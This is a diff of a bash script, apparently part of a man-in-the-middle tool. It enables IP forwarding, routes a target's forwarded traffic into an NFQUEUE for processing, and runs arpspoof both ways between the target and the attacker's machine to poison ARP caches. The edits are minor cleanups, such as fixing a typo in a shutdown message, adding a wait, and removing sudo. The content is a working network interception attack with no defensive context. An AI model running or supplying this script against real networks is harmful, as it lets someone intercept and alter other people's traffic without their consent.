@@ -15,11 +15,12 @@ echo "" > log
 trap 'end' INT
 
 function end() {
+  echo "Shutdown now..."
   kill $PID1
   kill $PID2
   iptables -F
-  echo "Shutdon now..."
   wait $PID1
+  wait $PID2
 }
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -27,10 +28,10 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 sudo iptables -A FORWARD -d $target -j NFQUEUE --queue-num 0
 sudo iptables -A FORWARD -s $target -j NFQUEUE --queue-num 0
 
-# Using arpspoof command to acting as a router
-sudo arpspoof -i $interface -t $target $attacker > arpspoof.log 2>&1 &
+# Start arpspoof commands in the background
+arpspoof -i $interface -t $target $attacker > arpspoof.log 2>&1 &
 PID1=$!
-sudo arpspoof -i $interface -t $attacker $target > arpspoof.log 2>&1 &
+arpspoof -i $interface -t $attacker $target > arpspoof.log 2>&1 &
 PID2=$!
 
 cat
